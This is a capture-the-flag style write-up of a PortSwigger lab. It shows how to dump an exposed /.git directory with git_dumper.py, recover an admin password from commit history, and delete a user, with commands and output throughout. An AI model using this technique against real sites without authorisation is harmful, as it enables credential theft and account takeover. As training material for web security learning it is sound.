# Lab: Information disclosure in version control history

### Instructions

This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete the user `carlos`. 

### Solution

Launching the lab we discover a `/.git` endpoint:

```
Index of /.git
Name	Size
<branches>	
description	73B
<hooks>	
<info>	
<refs>	
HEAD	23B
config	157B
<objects>	
index	225B
COMMIT_EDITMSG	34B
<logs>
```

At `https://0a47001f041f281b80ab493e00de0012.web-security-academy.net/.git/COMMIT_EDITMSG` we find the note:

```
Remove admin password from config
```

Checking `config` at : `https://0a47001f041f281b80ab493e00de0012.web-security-academy.net/.git/config` we confirm the admin password is not present.

We can use the tool `git_dumper.py` to retrieve these contents and version history: https://github.com/arthaud/git-dumper

```
┌──(venv)─(ryan㉿kali)-[~/PortSwigger_Labs/Information_Disclosure/Info_Disclosure_05_info_disclosure_in_version_control_history]
└─$ python3 /home/ryan/Tools/exploits/git_dumper.py https://0af500ff04285503825bf2b3009d00ba.web-security-academy.net//.git git
[-] Testing https://0af500ff04285503825bf2b3009d00ba.web-security-academy.net/.git/HEAD [200]
[-] Testing https://0af500ff04285503825bf2b3009d00ba.web-security-academy.net/.git/ [200]
[-] Fetching common files
[-] Fetching https://0af500ff04285503825bf2b3009d00ba.web-security-academy.net/.git/COMMIT_EDITMSG [200]
<SNIP>
```

We can run `git log` to view commits:

```
┌──(venv)─(ryan㉿kali)-[~/PortSwigger_Labs/Information_Disclosure/Info_Disclosure_05_info_disclosure_in_version_control_history/git]
└─$ git log
commit 47c80704c07044045ed414870a7078f600c4d380 (HEAD -> master)
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Tue Jun 23 14:05:07 2020 +0000

    Remove admin password from config

commit d6e9edc02c4838635389de88127b0c208bb4837d
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel
```

We can inspect the first commit with `git show`:

```
┌──(venv)─(ryan㉿kali)-[~/PortSwigger_Labs/Information_Disclosure/Info_Disclosure_05_info_disclosure_in_version_control_history/git]
└─$ git show d6e9edc02c4838635389de88127b0c208bb4837d
commit d6e9edc02c4838635389de88127b0c208bb4837d
Author: Carlos Montoya <carlos@carlos-montoya.net>
Date:   Mon Jun 22 16:23:42 2020 +0000

    Add skeleton admin panel

diff --git a/admin.conf b/admin.conf
new file mode 100644
index 0000000..0450fdb
--- /dev/null
+++ b/admin.conf
@@ -0,0 +1 @@
+ADMIN_PASSWORD=uga54l6qujr73o03qg1c
diff --git a/admin_panel.php b/admin_panel.php
new file mode 100644
index 0000000..8944e3b
--- /dev/null
+++ b/admin_panel.php
@@ -0,0 +1 @@
+<?php echo 'TODO: build an amazing admin panel, but remember to check the password!'; ?>
\ No newline at end of file
```

Here we have the administrator password.

We can use this to login to the site as admin and delete the user carlos, solving the lab.

```
Home

|
Admin panel

|
My account
Users
wiener - Delete
carlos - Delete
```

Note: Unlike most of my PortSwigger lab solutions, I did not write a custom Python exploit for this one. The vulnerability primarily involves recovering and analyzing an exposed Git repository, so leveraging existing Git tooling was more efficient than building a custom extractor.